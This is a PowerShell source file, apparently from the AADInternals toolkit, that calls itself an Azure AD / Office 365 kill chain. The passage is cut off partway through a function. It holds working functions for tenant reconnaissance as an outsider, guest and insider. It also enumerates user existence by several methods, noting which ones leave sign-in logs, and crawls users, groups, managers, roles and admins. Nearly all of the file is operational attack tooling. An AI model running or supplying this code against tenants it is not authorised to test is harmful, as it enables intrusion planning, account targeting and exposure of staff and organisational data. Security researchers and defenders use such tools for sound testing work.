#
# This file contains functions for Azure AD / Office 365 kill chain
#


# Invokes information gathering as an outsider
# Jun 16th 2020
function Invoke-ReconAsOutsider
{
<#
    .SYNOPSIS
    Starts tenant recon of the given domain.

    .DESCRIPTION
    Starts tenant recon of the given domain. Gets all verified domains of the tenant and extracts information such as their type.
    Also checks whether Desktop SSO (aka Seamless SSO) is enabled for the tenant.

    DNS:     Does the DNS record exists?
    MX:      Does the MX point to Office 365?
    SPF:     Does the SPF contain Exchange Online?
    Type:    Federated or Managed
    DMARC:   Is the DMARC record configured?
	DKIM:    Is the DKIM record configured?
    MTA-STS: Is the MTA-STS record configured?										  
    STS:     The FQDN of the federated IdP's (Identity Provider) STS (Security Token Service) server
    RPS:     Relaying parties of STS (AD FS)

    .Parameter DomainName
    Any domain name of the Azure AD tenant.

    .Parameter Single
    If the switch is used, doesn't get other domains of the tenant.

    .Parameter GetRelayingParties
    Tries to get relaying parties from STS. Returned if STS is AD FS and idpinitiatedsignon.aspx is enabled.

    .Example
    Invoke-AADIntReconAsOutsider -Domain company.com | Format-Table

    Tenant brand:       Company Ltd
    Tenant name:        company.onmicrosoft.com
    Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
    Tenant region:      NA
    DesktopSSO enabled: False
    MDI instance:       company.atp.azure.com

    Name                           DNS   MX    SPF  DMARC  DKIM MTA-STS Type      STS
    ----                           ---   --    ---  -----  ---- ------- ----      ---
    company.com                   True  True  True   True  True    True Federated sts.company.com
    company.mail.onmicrosoft.com  True  True  True   True  True   False Managed
    company.onmicrosoft.com       True  True  True  False  True   False Managed
    int.company.com              False False False  False  True   False Managed 

    .Example
    Invoke-AADIntReconAsOutsider -Domain company.com -GetRelayingParties | Format-Table

    Tenant brand:       Company Ltd
    Tenant name:        company.onmicrosoft.com
    Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
    Tenant region:      NA
    Uses cloud sync:    True
    DesktopSSO enabled: False
    MDI instance:       company.atp.azure.com

    Name                           DNS   MX    SPF  DMARC  DKIM MTA-STS Type      STS
    ----                           ---   --    ---  -----  ---- ------- ----      ---
    company.com                   True  True  True   True  True    True Federated sts.company.com
    company.mail.onmicrosoft.com  True  True  True   True  True   False Managed
    company.onmicrosoft.com       True  True  True  False  True   False Managed
    int.company.com              False False False  False  True   False Managed 

    .Example
    Invoke-AADIntReconAsOutsider -UserName user@company.com | Format-Table

    Tenant brand:       Company Ltd
    Tenant name:        company.onmicrosoft.com
    Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
    Tenant region:      NA
    DesktopSSO enabled: False
    MDI instance:       company.atp.azure.com
    Uses cloud sync:    True
    CBA enabled:        True

    Name                           DNS   MX    SPF  DMARC  DKIM MTA-STS Type      STS
    ----                           ---   --    ---  -----  ---- ------- ----      ---
    company.com                   True  True  True   True  True    True Federated sts.company.com
    company.mail.onmicrosoft.com  True  True  True   True  True   False Managed
    company.onmicrosoft.com       True  True  True  False  True   False Managed
    int.company.com              False False False  False  True   False Managed 
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="domain",Mandatory=$True)]
        [String]$DomainName,
        [Parameter(ParameterSetName="user",Mandatory=$True)]
        [String]$UserName,
        [Switch]$Single,
        [Switch]$GetRelayingParties
    )
    Process
    {
        if([string]::IsNullOrEmpty($DomainName))
        {
            $DomainName = $UserName.Split("@")[1]

            Write-Verbose "Checking CBA status."
            $tenantCBA = HasCBA -UserName $UserName
        }
        Write-Verbose "Checking if the domain $DomainName is registered to Azure AD"
        $tenantId =     Get-TenantID -Domain $DomainName
        if([string]::IsNullOrEmpty($tenantId))
        {
            throw "Domain $DomainName is not registered to Azure AD"
        }
        $tenantName =   ""
        $tenantBrand =  ""
        $tenantRegion = (Get-OpenIDConfiguration -Domain $DomainName).tenant_region_scope
        $tenantSSO =    ""
        
        Write-Verbose "`n*`n* EXAMINING TENANT $tenantId`n*"

        
        Write-Verbose "Getting domains.."
        $domains = Get-TenantDomains -Domain $DomainName
        Write-Verbose "Found $($domains.count) domains!"
        

        # Create an empty list
        $domainInformation = @()

        # Counter
        $c=1

        # Loop through the domains
        foreach($domain in $domains)
        {
            # Define variables
            $exists =         $false
            $hasCloudMX =     $false
            $hasCloudSPF =    $false
			$hasCloudDKIM =   $false
			$hasCloudMTASTS = $false

            if(-not $Single)
            {
                Write-Progress -Activity "Getting DNS information" -Status $domain -PercentComplete (($c/$domains.count)*100)
            }
            $c++

            # Check if this is "the initial" domain
            if([string]::IsNullOrEmpty($tenantName) -and $domain.ToLower() -match "^[^.]*\.onmicrosoft.com$")
            {
                $tenantName = $domain
                Write-Verbose "TENANT NAME: $tenantName"
            }

            # Check if the tenant has the Desktop SSO (aka Seamless SSO) enabled
            if([string]::IsNullOrEmpty($tenantSSO))
            {
                $tenantSSO = HasDesktopSSO -Domain $domain
            }

            if(-not $Single -or ($Single -and $DomainName -eq $domain))
            {
                # Check whether the domain exists in DNS
                try { $exists = (Resolve-DnsName -Name $Domain -ErrorAction SilentlyContinue -DnsOnly -NoHostsFile -NoIdn).count -gt 0 }  catch{}

                if($exists)
                {
                    # Check the MX record
                    $hasCloudMX = HasCloudMX -Domain $domain

                    # Check the SPF record
                    $hasCloudSPF = HasCloudSPF -Domain $domain

                    # Check the DMARC record
                    $hasDMARC = HasDMARC -Domain $domain
					
					# Check the DKIM record
					$hasCloudDKIM = HasCloudDKIM -Domain $domain
					
					# Check the MTA-STS record
					$hasCloudMTASTS = HasCloudMTASTS -Domain $domain
                }

                # Get the federation information
                $realmInfo = Get-UserRealmV2 -UserName "nn@$domain"
                if([string]::IsNullOrEmpty($tenantBrand))
                {
                    $tenantBrand = $realmInfo.FederationBrandName
                    Write-Verbose "TENANT BRAND: $tenantBrand"
                }
                if($authUrl = $realmInfo.AuthUrl)
                {
                    # Try to read relaying parties
                    if($GetRelayingParties)
                    {
                        try
                        {
                        
                            $idpUrl = $realmInfo.AuthUrl.Substring(0,$realmInfo.AuthUrl.LastIndexOf("/")+1)
                            $idpUrl += "idpinitiatedsignon.aspx"
                            Write-Verbose "Getting relaying parties for $domain from $idpUrl"
                            [xml]$page = Invoke-RestMethod -Uri $idpUrl -TimeoutSec 3

                            $selectElement = $page.html.body.div.div[2].div.div.div.form.div[1].div[1].select.option
                            $relayingParties = New-Object string[] $selectElement.Count
                            Write-Verbose "Got $relayingParties relaying parties from $idpUrl"
                            for($o = 0; $o -lt $selectElement.Count; $o++)
                            {
                                $relayingParties[$o] = $selectElement[$o].'#text'
                            }
                    
                        }
                        catch{} # Okay
                    }
                    # Get just the server name
                    $authUrl = $authUrl.split("/")[2]
                }

                # Set the return object properties
                $attributes=[ordered]@{
                    "Name" =    $domain
                    "DNS" =     $exists
                    "MX" =      $hasCloudMX
                    "SPF" =     $hasCloudSPF
                    "DMARC" =   $hasDMARC
					"DKIM" =    $hasCloudDKIM						 
					"MTA-STS" = $hasCloudMTASTS						   
                    "Type" =    $realmInfo.NameSpaceType
                    "STS" =     $authUrl 
                }
                if($GetRelayingParties)
                {
                    $attributes["RPS"] =   $relayingParties 
                }
                Remove-Variable "relayingParties" -ErrorAction SilentlyContinue
                $domainInformation += New-Object psobject -Property $attributes
            }
        }

        Write-Host "Tenant brand:       $tenantBrand"
        Write-Host "Tenant name:        $tenantName"
        Write-Host "Tenant id:          $tenantId"
        Write-Host "Tenant region:      $tenantRegion"
        
        # DesktopSSO status not definitive with a single domain
        if(!$Single -or $tenantSSO -eq $true)
        {
            Write-Host "DesktopSSO enabled: $tenantSSO"
        }

        # MDI instance not definitive, may have different instance name than the tenant name.
        if(![string]::IsNullOrEmpty($tenantName))
        {
            $tenantMDI = GetMDIInstance -Tenant $tenantName
            if($tenantMDI)
            {
                Write-Host "MDI instance:       $tenantMDI"
            }
        }

        # Cloud sync not definitive, may use different domain name
        if(DoesUserExists -User "ADToAADSyncServiceAccount@$($tenantName)")
        {
            Write-Host "Uses cloud sync:    $true"
        }

        # CBA status definitive if username was provided
        if($tenantCBA)
        {
            Write-Host "CBA enabled:        $tenantCBA"
        }
        
        return $domainInformation
    }

}


# Tests whether the user exists in Azure AD or not
# Jun 16th 2020
function Invoke-UserEnumerationAsOutsider
{
<#
    .SYNOPSIS
    Checks whether the given user exists in Azure AD or not. Returns $True or $False or empty.

    .DESCRIPTION
    Checks whether the given user exists in Azure AD or not. Works also with external users! Supports following enumeration methods: Normal, Login, Autologon, and RST2.

    The Normal method seems currently work with all tenants. Previously it required Desktop SSO (aka Seamless SSO) to be enabled for at least one domain. 

    The Login method works with any tenant, but enumeration queries will be logged to Azure AD sign-in log as failed login events!

    The Autologon method doesn't seem to work with all tenants anymore. Probably requires that DesktopSSO or directory sync is enabled.

    Returns $True or $False if existence can be verified and empty if not.

    .Parameter UserName
    List of User names or email addresses of the users.

    .Parameter External
    Whether the given user name is for external user. Requires also -Domain parater!

    .Parameter Domain
    The initial domain of the given tenant.

    .Parameter Method
    The used enumeration method. One of "Normal","Login","Autologon","RST2"

    .Example
    Invoke-AADIntUserEnumerationAsOutsider -UserName user@company.com

    UserName         Exists
    --------         ------
    user@company.com True

    .Example
    Invoke-AADIntUserEnumerationAsOutsider -UserName external.user@gmail.com -External -Domain company.onmicrosoft.com

    UserName                                             Exists
    --------                                             ------
    external.user_gmail.com#EXT#@company.onmicrosoft.com True

    .Example
    Invoke-AADIntUserEnumerationAsOutsider -UserName user@company.com,user2@company.com -Method Autologon

    UserName                                               Exists
    --------                                               ------
    user@company.com                                       True
    user2@company.com                                      False

    .Example
    Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider

    UserName                                               Exists
    --------                                               ------
    user@company.com                                       True
    user2@company.com                                      False
    user@company.net                                      
    external.user_gmail.com#EXT#@company.onmicrosoft.com   True
    external.user_outlook.com#EXT#@company.onmicrosoft.com False

    .Example
    Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Login

    UserName                                               Exists
    --------                                               ------
    user@company.com                                       True
    user2@company.com                                      False
    user@company.net                                       True
    external.user_gmail.com#EXT#@company.onmicrosoft.com   True
    external.user_outlook.com#EXT#@company.onmicrosoft.com False
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="Normal",  Mandatory=$True,ValueFromPipeline)]
        [Parameter(ParameterSetName="External",Mandatory=$True,ValueFromPipeline)]
        [String[]]$UserName,
        [Parameter(ParameterSetName="External", Mandatory=$True)]
        [Switch]$External,
        [Parameter(ParameterSetName="External",Mandatory=$True)]
        [String]$Domain,
        [Parameter(Mandatory=$False)]
        [ValidateSet("Normal","Login","Autologon","RST2")]
        [String]$Method="Normal"
    )
    Process
    {
        foreach($User in $UserName)
        {
            # If the user is external, change to correct format
            if($Method -eq "Normal" -and $External)
            {
                $User="$($User.Replace("@","_"))#EXT#@$domain"
            }

            new-object psobject -Property ([ordered]@{"UserName"=$User;"Exists" = $(DoesUserExists -User $User -Method $Method)})
        }
    }
}

# Invokes information gathering as a guest user
# Jun 16th 2020
function Invoke-ReconAsGuest
{
<#
    .SYNOPSIS
    Starts tenant recon of Azure AD tenant. Prompts for tenant.

    .DESCRIPTION
    Starts tenant recon of Azure AD tenant. Prompts for tenant.
    Retrieves information from Azure AD tenant, such as, the number of Azure AD objects and quota, and the number of domains (both verified and unverified).

    .Example
    Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

    PS C:\>$results = Invoke-AADIntReconAsGuest

    PS C:\>$results.allowedActions

    application      : {read}
    domain           : {read}
    group            : {read}
    serviceprincipal : {read}
    tenantdetail     : {read}
    user             : {read, update}
    serviceaction    : {consent}

    .Example
    Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

    PS C:\>Get-AADIntAzureTenants

    Id                                   Country Name                      Domains                                                                                                  
    --                                   ------- ----                      -------                                                                                                  
    221769d7-0747-467c-a5c1-e387a232c58c FI      Firma Oy                  {firma.mail.onmicrosoft.com, firma.onmicrosoft.com, firma.fi}              
    6e3846ee-e8ca-4609-a3ab-f405cfbd02cd US      Company Ltd               {company.onmicrosoft.com, company.mail.onmicrosoft.com,company.com}

    PS C:\>Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache -Tenant 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd

    $results = Invoke-AADIntReconAsGuest

    Tenant brand:                Company Ltd
    Tenant name:                 company.onmicrosoft.com
    Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
    Azure AD objects:            520/500000
    Domains:                     6 (4 verified)
    Non-admin users restricted?  True
    Users can register apps?     True
    Directory access restricted? False
    Guest access:                Normal
    CA policies:                 7

    PS C:\>$results.allowedActions

    application      : {read}
    domain           : {read}
    group            : {read}
    serviceprincipal : {read}
    tenantdetail     : {read}
    user             : {read, update}
    serviceaction    : {consent}
    
#>
    [cmdletbinding()]
    Param()
    Begin
    {
        # Choises
        $choises="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!""#%&/()=?*+-_"
    }
    Process
    {
        # Get access token from cache
        $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

        # Get the list of tenants the user has access to
        $tenants = Get-AzureTenants -AccessToken $AccessToken
        $tenantNames = $tenants | Select-Object -ExpandProperty Name

        # Prompt for tenant choice if more than one
        if($tenantNames.count -gt 1)
        {
            $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
            for($p=0; $p -lt $tenantNames.count; $p++)
            {
                $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
            }
            $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to recon",$options,0)
            }
        else
        {
            $opt=0
        }
        $tenantInfo = $tenants[$opt]
        $tenant =     $tenantInfo.Id

        # Get the tenant information
        $tenantInformation = Get-AzureInformation -Tenant $tenant

        # Guest access
        if(!$tenantInformation.authorizationPolicy)
        {
            $tenantInformation.guestAccess = "unknown"
        }

        # Print out some relevant information
        Write-Host "Tenant brand:                $($tenantInformation.displayName)"
        Write-Host "Tenant name:                 $($tenantInformation.domains | Where-Object isInitial -eq "True" | Select-Object -ExpandProperty id)"
        Write-Host "Tenant id:                   $($tenantInformation.objectId)"
        Write-Host "Azure AD objects:            $($tenantInformation.directorySizeQuota.used)/$($tenantInformation.directorySizeQuota.total)"
        Write-Host "Domains:                     $($tenantInformation.domains.Count) ($(($tenantInformation.domains | Where-Object isVerified -eq "True").Count) verified)"
        Write-Host "Non-admin users restricted?  $($tenantInformation.restrictNonAdminUsers)"
        Write-Host "Users can register apps?     $($tenantInformation.usersCanRegisterApps)"
        Write-Host "Directory access restricted? $($tenantInformation.restrictDirectoryAccess)"
        Write-Host "Guest access:                $($tenantInformation.guestAccess)"
        Write-Host "CA policies:                 $($tenantInformation.conditionalAccessPolicy.Count)" 
        Write-Host "Access package admins:       $($tenantInformation.accessPackageAdmins.Count)" 

        # Return
        return $tenantInformation

    }
}

# Starts crawling the organisation for user names and groups
# Jun 16th 2020
function Invoke-UserEnumerationAsGuest
{
<#
    .SYNOPSIS
    Crawls the target organisation for user names and groups.

    .DESCRIPTION
    Crawls the target organisation for user names, groups, and roles. The starting point is the signed-in user, a given username, or a group id.
    The crawl can be controlled with switches. Group members are limited to 1000 entries per group.

    Groups:       Include user's groups
    GroupMembers: Include members of user's groups
    Roles:        Include roles of user and group members. Can be very time consuming!
    Manager:      Include user's manager
    Subordinates: Include user's subordinates (direct reports)
    
    UserName:     User principal name (UPN) of the user to search.
    GroupId:      Id of the group. If this is given, only the members of the group are included. 

    .Example
    $results = Invoke-AADIntUserEnumerationAsGuest -UserName user@company.com

    Tenant brand: Company Ltd
    Tenant name:  company.onmicrosoft.com
    Tenant id:    6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
    Logged in as: live.com#user@outlook.com
    Users:        5
    Groups:       2
    Roles:        0

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]$UserName,
        [Switch]$Groups,
        [Switch]$GroupMembers,
        [Switch]$Subordinates,
        [Switch]$Manager,
        [Switch]$Roles,
        [Parameter(Mandatory=$False)]
        [String]$GroupId
    )
    Begin
    {
        # Choises
        $choises="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!""#%&/()=?*+-_"
    }
    Process
    {
        # Get access token from cache
        $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

        # Get the list of tenants the user has access to
        Write-Verbose "Getting list of user's tenants.."
        $tenants = Get-AzureTenants -AccessToken $AccessToken
        $tenantNames = $tenants | Select-Object -ExpandProperty Name

        # Prompt for tenant choice if more than one
        if($tenantNames.count -gt 1)
        {
            $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
            for($p=0; $p -lt $tenantNames.count; $p++)
            {
                $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
            }
            $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to recon",$options,0)
            }
        else
        {
            $opt=0
        }
        $tenantInfo = $tenants[$opt]
        $tenant =     $tenantInfo.Id

        # Create a new AccessToken for graph.microsoft.com
        $refresh_token = Get-RefreshTokenFromCache -ClientID "d3590ed6-52b3-4102-aeff-aad2292ab01c" -Resource "https://management.core.windows.net"
        if([string]::IsNullOrEmpty($refresh_token))
        {
            throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
        }
        try
        {
            $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://graph.microsoft.com" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId $tenant -RefreshToken $refresh_token -SaveToCache $true
        }
        catch
        {
            Throw "Unable to get access token for Microsoft Graph API"
        }

        # Get the initial domain
        $domains = Get-MSGraphDomains -AccessToken $AccessToken
        $tenantDomain = $domains | Where-Object isInitial -eq "True" | Select-Object -ExpandProperty id
        if([string]::IsNullOrEmpty($tenantDomain))
        {
            Throw "No initial domain found for the tenant $tenant!"
        }
        Write-Verbose "Tenant $Tenant / $tenantDomain selected."

        

        # If GroupID is given, dump only the members of that group
        if($GroupId)
        {
            # Create users object
            $ht_users=@{}

            # Get group members
            $members = Get-MSGraphGroupMembers -AccessToken $AccessToken -GroupId $GroupId

            # Create a variable for members
            $itemMembers = @()

            # Loop trough the members
            foreach($member in $members)
            {
                $ht_users[$member.Id] = $member
                $itemMembers += $member.userPrincipalName
            }
        }
        else
        {

            # If user name not given, try to get one from the access token
            if([string]::IsNullOrEmpty($UserName))
            {
                $UserName = (Read-Accesstoken -AccessToken $AccessToken).upn

                # If upn not found, this is probably live.com user, so use email instead of upn
                if([string]::IsNullOrEmpty($UserName))
                {
                    $UserName = (Read-Accesstoken -AccessToken $AccessToken).email
                }

                if(-not ($UserName -like "*#EXT#*"))
                {
                    # As this must be an extrernal user, convert to external format
                    $UserName = "$($UserName.Replace("@","_"))#EXT#@$tenantDomain"
                }
            }

            Write-Verbose "Getting user information for user $UserName"

            # Get the user information
            $user = Get-MSGraphUser -UserPrincipalName $UserName -AccessToken $AccessToken 

            if([string]::IsNullOrEmpty($user))
            {
                throw "User $UserName not found!"
            }

            # Create the users object
            $ht_users=@{
                $user.id = $user
                }

            # Create the groups object
            $ht_groups=@{}

            # Create the roles object
            $ht_roles=@{}

            Write-Verbose "User found: $($user.id) ($($user.userPrincipalName))"

            # Loop through the user's subordinates
            if($Subordinates)
            {
                # Copy the keys as the hashtable may change
                $so_keys = New-Object string[] $ht_users.Count
                $ht_users.Keys.CopyTo($so_keys,0)

                # Loop through the users
                foreach($userId in $so_keys)
                {
                    $user = $ht_users[$userId].userPrincipalName
                    Write-Verbose "Getting subordinates of $user"

                    # Get user's subordinates
                    $userSubordinates = Get-MSGraphUserDirectReports -AccessToken $AccessToken -UserPrincipalName $user

                    # Loop trough the users
                    foreach($subordinate in $userSubordinates)
                    {
                        $ht_users[$subordinate.Id] = $subordinate
                    }
                }
            }

            # Get user's manager
            if($Manager)
            {
                try{$userManager= Get-MSGraphUserManager -AccessToken $AccessToken -UserPrincipalName $UserName}catch{}
                if($userManager)
                {
                    $ht_users[$userManager.id] = $userManager
                }
            }

            # Loop through the users' groups
            if($Groups -or $GroupMembers)
            {
                foreach($userId in $ht_users.Keys)
                {
                    $groupUser = $ht_users[$userId].userPrincipalName
                    Write-Verbose "Getting groups of $groupUser"

                    # Get user's groups
                    $userGroups = Get-MSGraphUserMemberOf -AccessToken $AccessToken -UserPrincipalName $groupUser

                    # Loop trough the groups
                    foreach($group in $userGroups)
                    {
                        # This is a normal group
                        if($group.'@odata.type' -eq "#microsoft.graph.group")
                        {
                            $ht_groups[$group.id] = $group
                            #$itemGroups += $group.id
                        }
                    }

                }
            }

            # Loop through the group members
            if($GroupMembers)
            {
                foreach($groupId in $ht_groups.Keys)
                {
                    Write-Verbose "Getting groups of $groupUser"

                    # Get group members
                    $members = Get-MSGraphGroupMembers -AccessToken $AccessToken -GroupId $groupId

                    # Create a variable for members
                    $itemMembers = @()

                    # Loop trough the members
                    foreach($member in $members)
                    {
                        $ht_users[$member.Id] = $member
                        $itemMembers += $member.userPrincipalName
                    }

                    # Add members to the group
                    $ht_groups[$groupId] | Add-Member -NotePropertyName "members" -NotePropertyValue $itemMembers

                    # Get group owners
                    $owners = Get-MSGraphGroupOwners -AccessToken $AccessToken -GroupId $groupId

                    # Create a variable for members
                    $itemOwners = @()

                    # Loop trough the members
                    foreach($owner in $owners)
                    {
                        $ht_users[$owner.Id] = $owner
                        $itemOwners += $owner.userPrincipalName
                    }

                    # Add members to the group
                    $ht_groups[$groupId] | Add-Member -NotePropertyName "owners" -NotePropertyValue $itemOwners
                }
            }

            # Loop through the users' roles
            if($Roles)
            {
                foreach($userId in $ht_users.Keys)
                {
                    $roleUser = $ht_users[$userId].userPrincipalName
                    Write-Verbose "Getting roles of $roleUser"

                    # Get user's roles
                    $userRoles = Get-MSGraphUserMemberOf -AccessToken $AccessToken -UserPrincipalName $roleUser

                    # Loop trough the groups
                    foreach($userRole in $userRoles)
                    {
                        if($userRole.'@odata.type' -eq "#microsoft.graph.directoryRole")
                        {
                            # Try to get the existing role first
                            $role = $ht_roles[$userRole.id]
                            if($role)
                            {
                                # Add a new member to the role
                                $role.members+=$ht_users[$userId].userPrincipalName
                            }
                            else
                            {
                                # Create a members attribute
                                $userRole | Add-Member -NotePropertyName "members" -NotePropertyValue @($ht_users[$userId].userPrincipalName)
                                $role = $userRole
                            }

                            $ht_roles[$role.id] = $role
                        }
                    }

                }
            }

            # Loop through the role members
            if($Roles)
            {
                foreach($roleId in $ht_roles.Keys)
                {
                    $members = $null
                    Write-Verbose "Getting role members for '$($ht_roles[$roleId].displayName)'"

                    # Try to get role members, usually fails
                    try{$members = Get-MSGraphRoleMembers -AccessToken $AccessToken -RoleId $roleId}catch{ }

                    if($members)
                    {
                        # Create a variable for members
                        $itemMembers = @()

                        # Loop trough the members
                        foreach($member in $members)
                        {
                            $ht_users[$member.Id] = $member
                            $itemMembers += $member.userPrincipalName
                        }

                        # Add members to the role
                        $ht_roles[$roleId] | Add-Member -NotePropertyName "members" -NotePropertyValue $itemMembers -Force
                    }
                }
            }
        }

        # Print out some relevant information
        Write-Host "Tenant brand: $($tenantInfo.Name)"
        Write-Host "Tenant name:  $tenantDomain"
        Write-Host "Tenant id:    $($tenantInfo.id)"
        Write-Host "Logged in as: $((Read-Accesstoken -AccessToken $AccessToken).unique_name)"
        Write-Host "Users:        $($ht_users.count)"
        Write-Host "Groups:       $($ht_groups.count)"
        Write-Host "Roles:        $($ht_roles.count)"

        # Create the return value
        $attributes=@{
            "Users" =  $ht_users.values
            "Groups" = $ht_groups.Values
            "Roles" =  $ht_roles.Values
        }
        return New-Object psobject -Property $attributes
    }
}


# Invokes information gathering as an internal user
# Aug 4th 2020
function Invoke-ReconAsInsider
{
<#
    .SYNOPSIS
    Starts tenant recon of Azure AD tenant.

    .DESCRIPTION
    Starts tenant recon of Azure AD tenant.
    
    .Example
    Get-AADIntAccessTokenForAzureCoreManagement

    PS C:\>$results = Invoke-AADIntReconAsInsider

    Tenant brand:                Company Ltd
    Tenant name:                 company.onmicrosoft.com
    Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
    Tenant SKU:                  E3
    Azure AD objects:            520/500000
    Domains:                     6 (4 verified)
    Non-admin users restricted?  True
    Users can register apps?     True
    Directory access restricted? False
    Directory sync enabled?      true
    Global admins:               3
    CA policies:                 8
    MS Partner IDs:              
    MS Partner DAP enabled?      False
    MS Partner contracts:        0
    MS Partners:                 1

    PS C:\>$results.roleInformation | Where-Object Members -ne $null | Select-Object Name,Members

    Name                               Members                                                                                       
    ----                               -------                                                                                       
    Company Administrator              {@{DisplayName=MOD Administrator; UserPrincipalName=admin@company.onmicrosoft.com}, @{D...
    User Account Administrator         @{DisplayName=User Admin; UserPrincipalName=useradmin@company.com}                   
    Directory Readers                  {@{DisplayName=Microsoft.Azure.SyncFabric; UserPrincipalName=}, @{DisplayName=MicrosoftAzur...
    Directory Synchronization Accounts {@{DisplayName=On-Premises Directory Synchronization Service Account; UserPrincipalName=Syn...
#>
    [cmdletbinding()]
    Param()
    Begin
    {
        
    }
    Process
    {
        # Get access token from cache
        $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        
        # Get the refreshtoken from the cache and create AAD token
        $tenantId = (Read-Accesstoken $AccessToken).tid
        $refresh_token = Get-RefreshTokenFromCache -AccessToken $AccessToken
        
        $AAD_AccessToken       = Get-AccessTokenWithRefreshToken -RefreshToken $refresh_token -Resource "https://graph.windows.net" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId $tenantId
        $MSPartner_AccessToken = Get-AccessTokenWithRefreshToken -RefreshToken $refresh_token -Resource "fa3d9a0c-3fb0-42cc-9193-47c7ecd2edbd" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId $tenantId
        $AdminAPI_AccessToken  = Get-AccessTokenWithRefreshToken -RefreshToken $refresh_token -Resource "https://admin.microsoft.com" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId $tenantId

        # Get the tenant information
        Write-Verbose "Getting company information"
        $companyInformation = Get-CompanyInformation -AccessToken $AAD_AccessToken

        # Get the sharepoint information
        Write-Verbose "Getting SharePoint Online information"
        $sharePointInformation = Get-SPOServiceInformation -AccessToken $AAD_AccessToken

        # Get the admins
        Write-Verbose "Getting role information"
        $roles = Get-Roles -AccessToken $AAD_AccessToken
        $roleInformation=@()
        $sortedRoles = $roles.Role | Sort-Object -Property Name
        foreach($role in $roles.Role)
        {
            Write-Verbose "Getting members of role ""$($role.Name)"""
            $attributes=[ordered]@{}
            $attributes["Name"] = $role.Name
            $attributes["IsEnabled"] = $role.IsEnabled
            $attributes["IsSystem"] = $role.IsSystem
            $attributes["ObjectId"] = $role.ObjectId
            $members = Get-RoleMembers -AccessToken $AAD_AccessToken -RoleObjectId $role.ObjectId | Select-Object @{N='DisplayName'; E={$_.DisplayName}},@{N='UserPrincipalName'; E={$_.EmailAddress}}

            $attributes["Members"] = $members

            $roleInformation += New-Object psobject -Property $attributes
        }

        # Get the tenant information
        Write-Verbose "Getting tenant information"
        $tenantInformation = Get-AzureInformation -Tenant $tenantId

        # Get basic partner information
        Write-Verbose "Getting basic partner information"
        $partnerInformation = Get-PartnerInformation -AccessToken $AAD_AccessToken

        # Get partner organisation information
        Write-Verbose "Getting partner organisation information"
        $partnerOrganisations = @(Get-MSPartnerOrganizations -AccessToken $MSPartner_AccessToken)

        # Get partner role information
        Write-Verbose "Getting partner role information"
        $partnerRoleInformation = @(Get-MSPartnerRoleMembers -AccessToken $MSPartner_AccessToken)

        # Get partner contracts (customers)
        Write-Verbose "Getting partner contracts (customers)"
        try
        {
            $partnerContracts = @(Get-MSPartnerContracts -AccessToken $AAD_AccessToken)
        }
        catch
        {
            # Okay, not all are partner organisations :)
        }

        # Get partners
        Write-Verbose "Getting partners"
        try
        {
            $partners = @(Get-MSPartners -AccessToken $AdminAPI_AccessToken)
        }
        catch
        {
            # Okay
        }

        # AzureAD SKU
        $tenantSku = @()
        if($tenantInformation.skuInfo.aadPremiumBasic)
        {
            $tenantSku += "Premium Basic"
        }
        if($tenantInformation.skuInfo.aadPremium)
        {
            $tenantSku += "Premium P1"
        }
        if($tenantInformation.skuInfo.aadPremiumP2)
        {
            $tenantSku += "Premium P2"
        }
        if($tenantInformation.skuInfo.aadBasic)
        {
            $tenantSku += "Basic"
        }
        if($tenantInformation.skuInfo.aadBasicEdu)
        {
            $tenantSku += "Basic Edu"
        }
        if($tenantInformation.skuInfo.aadSmb)
        {
            $tenantSku += "SMB"
        }
        if($tenantInformation.skuInfo.enterprisePackE3)
        {
            $tenantSku += "E3"
        }
        if($tenantInformation.skuInfo.enterprisePremiumE5)
        {
            $tenantSku += "Premium E5"
        }
        

        # Set the extra tenant information
        $tenantInformation |Add-Member -NotePropertyName "companyInformation"     -NotePropertyValue $companyInformation
        $tenantInformation |Add-Member -NotePropertyName "SPOInformation"         -NotePropertyValue $sharePointInformation
        $tenantInformation |Add-Member -NotePropertyName "roleInformation"        -NotePropertyValue $roleInformation
        $tenantInformation |Add-Member -NotePropertyName "partnerDAPEnabled"      -NotePropertyValue ($partnerInformation.DapEnabled -eq "true")
        $tenantInformation |Add-Member -NotePropertyName "partnerType"            -NotePropertyValue $partnerInformation.CompanyType
